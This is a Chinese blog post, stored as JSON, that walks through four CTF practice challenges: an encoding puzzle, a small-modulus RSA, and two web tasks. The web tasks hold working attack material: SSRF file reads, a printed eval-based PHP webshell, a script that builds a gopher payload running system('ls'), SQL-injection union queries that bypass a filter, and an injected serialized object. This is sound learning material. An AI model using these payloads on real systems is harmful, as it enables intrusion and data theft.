{"title":"星阑平台练习","uid":"c2e945f14bdb314a4d9b15471662d692","slug":"星阑平台练习","date":"2020-04-10T15:54:22.000Z","updated":"2020-10-08T12:11:12.000Z","comments":true,"path":"api/articles/星阑平台练习.json","keywords":"A1andNS","cover":[],"content":"<h2 id=\"0x0001-Misc-2\"><a href=\"#0x0001-Misc-2\" class=\"headerlink\" title=\"0x0001 Misc 2\"></a>0x0001 Misc 2</h2><p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411205105.png\" alt=\"题目\"></p>\n<p>一开始不知道是什么意思后来看了一下字母，发现只有ABCDE，所以猜测这是一个16进制段</p>\n<p>在网上用工具把16进制转换为ascii后，得到了cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411210859.png\" alt=\"转ascii\"></p>\n<p>看起来有点像base64,去试了一下。</p>\n<p>得到r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM </p>\n<p>这个完全看不懂是什么，单词似乎不太可能，难搞。</p>\n<p>直到开始看键盘，感觉似乎是键盘密码。r5yg中间刚好夹着个t，其他的也一样。</p>\n<p>这样就可以推出tongyuan了。加上题目开头的PS：感觉应该是了。</p>\n<p>所以就试着去提交了一下，flag{tongyuan+}</p>\n<p>正确了。</p>\n<h2 id=\"0x0002-WEB2\"><a href=\"#0x0002-WEB2\" class=\"headerlink\" title=\"0x0002 WEB2\"></a>0x0002 WEB2</h2><p>一开始就提供了php源代码，这里很明显可以看出有一个SSRF漏洞。我们可以通过这个漏洞任意读取文件。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_HEADER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$re</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token variable\">$re</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">empty</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$url</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">curl</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n<span class=\"token punctuation\">&#125;</span>\n</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>一开始先对这个网页做个扫描</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411204919.png\" alt=\"扫描结果\"></p>\n<p>发现一个robots.txt访问一下。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411205325.png\" alt=\"robots.txt\"></p>\n<p>发现一个webshell，访问一下，回显这是一个webshell。</p>\n<p>使用SSRF来读取webshell源代码。</p>\n<p>构造一个<code>?url=file:///var/www/html/webshe11231231231.php</code></p>\n<p>这一步我把php文件名给打错了，搞的浪费了好多时间。</p>\n<p>访问没有回显，看一下网页源代码，在源代码里看到了PHP源码。</p>\n<pre class=\"line-numbers language-PHP\" data-language=\"PHP\"><code class=\"language-PHP\">&lt;?php\n\n$serverList &#x3D; array(\n    &quot;127.0.0.1&quot;\n);\n$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];\nforeach ($serverList as $host) &#123;\n    if ($ip &#x3D;&#x3D;&#x3D; $host) &#123;\n        if ((!empty($_POST[&#39;admin&#39;])) and $_POST[&#39;admin&#39;] &#x3D;&#x3D;&#x3D; &#39;h1admin&#39;) &#123;\n            @eval($_POST[&#39;hacker&#39;]);\n        &#125; \n        else &#123;\n            die(&quot;You aren&#39;t admin!&quot;);\n        &#125;\n    &#125;\n    else &#123;\n        die(&#39;This is webshell&#39;);\n    &#125;\n&#125;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过分析他是需要IP地址是127.0.0.1才能够进入post阶段。</p>\n<p>我是直接<code>http://152.136.63.75:8016/?url=127.0.0.1/webshe11231231231.php</code>访问的。</p>\n<p>回显：You aren’t admin!</p>\n<p>于是继续去，我起初直接使用了post方法去提交admin=h1admin，结果当然是不行的，后来也是向别人请教才搞懂的，原来是要用gopher协议才行。后来就是要构建一个payload了，可是我不知道怎么搞就上网百度了学习了一下。</p>\n<pre class=\"line-numbers language-Python\" data-language=\"Python\"><code class=\"language-Python\">exp&#x3D;&#39;&#39;&#39;\\\nPOST &#x2F;webshe11231231231.php HTTP&#x2F;1.1\nHost:127.0.0.1\nUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;75.0\nAccept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8\nAccept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application&#x2F;x-www-form-urlencoded\nContent-Length: 34\nConnection: close\nUpgrade-Insecure-Requests: 1\n\nadmin&#x3D;h1admin&amp;hacker&#x3D;system(&#39;ls&#39;);\n&#39;&#39;&#39;\nimport urllib\nfrom urllib.parse import quote\ntmp &#x3D; quote(exp)\nnew &#x3D; tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)\nresult &#x3D; &quot;_&quot;+quote(new)\nprint(result)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>运行得到一个url编码的payload</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411211044.png\" alt=\"payload\"></p>\n<p>构造<code>http://152.136.63.75:8016/?url=gopher://127.0.0.1:80/_POST%2520/webshe11231231231.php%2520HTTP/1.1%250D%250AHost%253A127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A61.0%2529%2520Gecko/20100101%2520Firefox/75.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%252034%250D%250ACookie%253A%2520Phpstorm-c2b818%253Dbe05b847-c935-441b-bdb7-465508c336b0%250D%250AConnection%253A%2520close%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250Aadmin%253Dh1admin%2526hacker%253Dsystem%2528%2527ls%2527%2529%253B%250D%250A</code></p>\n<p>访问后回显目录</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200411211857.png\" alt=\"目录\"></p>\n<p>发现一个fl1234aaaaaggggg.php</p>\n<p>和之前一样构建<code>?url=file:///var/www/html/fl1234aaaaaggggg.php</code></p>\n<p>和之前一样没有回显，查看源代码</p>\n<p>发现flag</p>\n<p><img src=\"https://s1.ax1x.com/2020/04/11/GbOwOH.png\" alt=\"flag\"></p>\n<p>flag{Th1s_EaSy_sSRF}</p>\n<p>这题用到了SSRF+gopher攻击。</p>\n<h2 id=\"0x0003-crypto1\"><a href=\"#0x0003-crypto1\" class=\"headerlink\" title=\"0x0003 crypto1\"></a>0x0003 crypto1</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">n&#x3D;1606938044309278499168642398192229212629290234347717645487123 \ne&#x3D;0x10001 \ncipher&#x3D;1206101155741464091016050901578054614292420649123909371122176 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>这题直接给了n，e和cipher。首先就是要做n的大数分解，我这里是用了一个<a href=\"http://www.factordb.com/index.php?query=1606938044309278499168642398192229212629290234347717645487123\">在线大数分解网站</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200415193456.png\" alt=\"大数分解\"></p>\n<p>还好n不大，我就成功分解得到了p和q了。</p>\n<p>这下就是RSA中已知p、q、e的情况了。直接用脚本。</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> gmpy2\n<span class=\"token keyword\">import</span> libnum\n\nn<span class=\"token operator\">=</span><span class=\"token number\">1606938044309278499168642398192229212629290234347717645487123</span>\np<span class=\"token operator\">=</span><span class=\"token number\">1267650600235241044365044382487</span>                   <span class=\"token comment\">#大数分解得到p和q</span>\nq<span class=\"token operator\">=</span><span class=\"token number\">1267650600260888172240281085029</span>\ne<span class=\"token operator\">=</span><span class=\"token number\">0x10001</span>\nciper<span class=\"token operator\">=</span><span class=\"token number\">1206101155741464091016050901578054614292420649123909371122176</span>\n\nphi <span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>                      <span class=\"token comment\">#计算n的欧拉函数值</span>\nd <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span>               <span class=\"token comment\">#d * e≡1 mod phi</span>\n<span class=\"token comment\">#print(d)</span>\nm<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>ciper<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span>                      <span class=\"token comment\">#m≡c^d mod n </span>\n<span class=\"token comment\">#print(m)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>libnum<span class=\"token punctuation\">.</span>n2s<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>就是一个比较常见的RSA，也就会这一种，其他RSA不懂了。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200415193528.png\" alt=\"运行结果\"></p>\n<p>运行一下脚本，成功得到了flag。</p>\n<p>flag{n_is_too_small!!!}</p>\n<h2 id=\"0x0004-web1\"><a href=\"#0x0004-web1\" class=\"headerlink\" title=\"0x0004 web1\"></a>0x0004 web1</h2><p>日常先去扫一下目录看看有没有什么提示信息。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180638.png\" alt=\"扫描结果\"></p>\n<p>看到了robots.txt ，那刚好就去看一下。顺便访问一下其他的user.php</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417181011.png\" alt=\"robots.txt\"></p>\n<p>在robots.txt中看到了一个user.php的备份文件，把他下载到了本地，user.php直接访问是什么都没有的，源代码也是空白。那么就只能从备份文件入手了。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">UserInfo</span>\n<span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$age</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">name</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$name</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">age</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword type-casting\">int</span><span class=\"token punctuation\">)</span><span class=\"token variable\">$age</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$ch</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_URL</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">curl_setopt</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLOPT_RETURNTRANSFER</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$output</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_exec</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$httpCode</span> <span class=\"token operator\">=</span> <span class=\"token function\">curl_getinfo</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">CURLINFO_HTTP_CODE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$httpCode</span> <span class=\"token operator\">==</span> <span class=\"token number\">404</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">404</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token function\">curl_close</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ch</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$output</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">getBlogContents </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">isValidBlog </span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$blog</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">blog</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$blog</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>从源码可以看出存在SSRF漏洞，但是blog是做了一个正则匹配的。</p>\n<p>有一个注册和登录按钮，我先去做一个账号注册。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180620.png\" alt=\"首页\"></p>\n<p>注册了一个hahaha用户名的用户。</p>\n<p>打开我们hahaha的主页，注意到了URL中的传入的no参数。试了一下是否存在注入漏洞，发现存在注入漏洞，但是他进行了一定的过滤。</p>\n<p>经过测试发现有4列</p>\n<p><code>?no=13+union+select+1,2,3,4</code>发现有过滤，这个是没法用的。</p>\n<p><code>?no=13/**/union/**/select/**/1,2,3,4%23</code>发现没有显示我们需要的显示，还是正常显示，所以有可能是只显示一行。</p>\n<p><code>?no=13/**/union/**/select/**/1,2,3,4/**/limit/**/1,1%23</code>，有结果了，发现第2列可以用来显示信息。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180359.png\" alt=\"回显\"></p>\n<p>试着查询了一下版本：10.2.26-MariaDB-log</p>\n<p>数据库名称为fakebook</p>\n<p>我们看一下表名</p>\n<p><code>no=13/**/union/**/select/**/1,table_name,3,4/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23</code></p>\n<p>找到了一个users的表</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180234.png\" alt=\"表名\"></p>\n<p><code>no=13/**/union/**/select/**/1,group_concat(column_name),3,4/**/from/**/information_schema.columns/**/where/**/table_name=&#39;users&#39;/**/limit/**/1,1%23</code></p>\n<p>找到了列名</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180211.png\" alt=\"列名\">看看data。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180132.png\" alt=\"序列化\"></p>\n<p>这是我注册的账号的data，没有仅仅的SQL注入这么简单。这题可能涉及到了序列化。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180943.png\" alt=\"反序列化\"></p>\n<p>顶部的提示更加佐证这点，有一个反序列化函数报错了。说明他在显示网页内容是要对我们注册时的数据进行一次反序列化操作，而从代码来看，这里的反序列化后curl执行的URL是没有经过正则过滤的。</p>\n<p><code>no=13/**/union/**/select/**/1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;haha&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#39;/**/limit/**/1,1%23</code>传入一个序列化的数据，得到一个base64编码。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417180108.png\" alt=\"base64\"></p>\n<p>解码一下得到了flag{A5168B63-4213-4D92-BC88-26F934A7BB7B}</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417175920.png\" alt=\"flag\"></p>\n<p>这里是SQL＋SSRF+反序列化结合解答出来的。</p>\n","text":"0x0001 Misc 2 一开始不知道是什么意思后来看了一下字母，发现只有ABCDE，所以猜测这是一个16进制段 在网上用工具把16进制转换为ascii后，得到了cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g 看起来有点像bas...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Misc","slug":"Misc","count":3,"path":"api/tags/Misc.json"},{"name":"Crypto","slug":"Crypto","count":4,"path":"api/tags/Crypto.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x0001-Misc-2\"><span class=\"toc-text\">0x0001 Misc 2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x0002-WEB2\"><span class=\"toc-text\">0x0002 WEB2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x0003-crypto1\"><span class=\"toc-text\">0x0003 crypto1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x0004-web1\"><span class=\"toc-text\">0x0004 web1</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Cookie注入练习题","uid":"6bb2202be349e1d43d125b9c1b0ff943","slug":"Cookie注入练习题","date":"2020-04-17T12:09:30.000Z","updated":"2020-04-18T01:35:14.000Z","comments":true,"path":"api/articles/Cookie注入练习题.json","keywords":"A1andNS","cover":[],"text":"最近做了一题Cookie注入的题目 这是一题cookie注入的练习题，出自BSidesCF 2019]Sequel，这里用BUUOJ来做。 爆破得到username为guest，password为guest 登陆进去 看到一个电影数据库，其他什么都没有看看网页源码和HTTP请求内...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"常用网络安全设备默认口令","uid":"b2e98445dd6803f9f6409873488359c5","slug":"常用网络安全设备默认口令","date":"2020-04-10T14:47:34.000Z","updated":"2020-04-13T00:48:10.000Z","comments":true,"path":"api/articles/常用网络安全设备默认口令.json","keywords":"A1andNS","cover":null,"text":"本文转载自https://www.cnblogs.com/R3col/p/12452571.html 一个搜密码平台http://www.sopwd.com/ 产品名称 默认账号 默认密码 深信服产品 sangfor sangfor sangfor@2018 sangfor@20...","link":"","photos":[],"count_time":{"symbolsCount":"2.5k","symbolsTime":"2 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":31,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"网络安全","slug":"网络安全","count":32,"path":"api/tags/网络安全.json"},{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"密码口令","slug":"密码口令","count":1,"path":"api/tags/密码口令.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}